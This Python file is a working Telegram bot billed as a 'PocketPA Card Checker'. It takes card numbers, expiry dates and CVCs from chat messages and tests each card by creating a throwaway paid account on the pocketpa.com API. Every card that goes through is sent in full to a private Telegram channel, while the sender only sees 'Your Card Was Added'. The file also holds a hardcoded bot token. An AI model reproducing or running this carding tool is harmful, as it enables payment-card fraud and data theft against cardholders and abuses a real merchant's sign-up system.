import telebot
import requests
import random
import string
import re
import urllib.parse

POCKETPA_BOT_TOKEN = "7194711538:AAHr734HrJWS7fub791CMhyJpDlDCcrF2ww"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(POCKETPA_BOT_TOKEN)

def extract_card_details(text):
    card = re.search(r'\d{13,19}', text.replace(" ", ""))
    cvc = re.search(r'(\d{3,4})(?!.*\d)', text)
    exp = re.search(r'(\d{1,2})[\/|\-| ](\d{2,4})', text)
    return {
        "card_number": card.group() if card else None,
        "exp_month": exp.group(1) if exp else None,
        "exp_year": exp.group(2) if exp else None,
        "cvc": cvc.group(1) if cvc else None
    }

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 PocketPA Card Checker\n"
        "Send card in any format (spaces, slashes, pipes, etc)."
    )

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    try:
        details = extract_card_details(message.text)
        if not all(details.values()):
            bot.reply_to(message, "❌ Could not extract all card details. Please try again.")
            return

        email = generate_random_email()
        phone = "+13144740467"
        zip_code = "BA3 HAL"

        with requests.Session() as session:
            # Step 1: Get CSRF cookie and session cookies
            session.get(
                "https://api.pocketpa.com/sanctum/csrf-cookie",
                headers={
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )
            raw_token = session.cookies.get("XSRF-TOKEN", "")
            xsrf_token = urllib.parse.unquote(raw_token)

            payload = {
                "name": "Telegram User",
                "email": email,
                "phone": phone,
                "country_code": "1",
                "password": "TempPass123!",
                "locale": "en",
                "plan_id": "price_1NK6JMDuSyQMYtIMfauDnsfM",
                "zip_code": zip_code,
                "is_affiliate": False,
                "card": {
                    "number": details["card_number"],
                    "exp_month": details["exp_month"].zfill(2),
                    "exp_year": details["exp_year"][-2:] if len(details["exp_year"]) > 2 else details["exp_year"],
                    "cvc": details["cvc"]
                }
            }

            response = session.post(
                "https://api.pocketpa.com/api/register",
                json=payload,
                headers={
                    "x-xsrf-token": xsrf_token,
                    "ppa-locale": "en",
                    "accept": "application/json",
                    "content-type": "application/json",
                    "origin": "https://app.pocketpa.com",
                    "referer": "https://app.pocketpa.com/"
                }
            )

            resp_json = response.json()
            if resp_json.get("status") == "success" or response.status_code == 201:
                success_msg = (
                    f"✅ PocketPA Payment Successful!\n"
                    f"Card: {details['card_number']} | {details['exp_month']}/{details['exp_year']} | {details['cvc']}\n"
                    f"Email: {email}\n"
                    f"Full Response:\n{resp_json}"
                )
                bot.reply_to(message, "✅ Your Card Was Added")
                bot.send_message(CHANNEL_ID, success_msg)
            else:
                bot.reply_to(message, f"❌ Declined or error: {resp_json.get('message', resp_json)}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()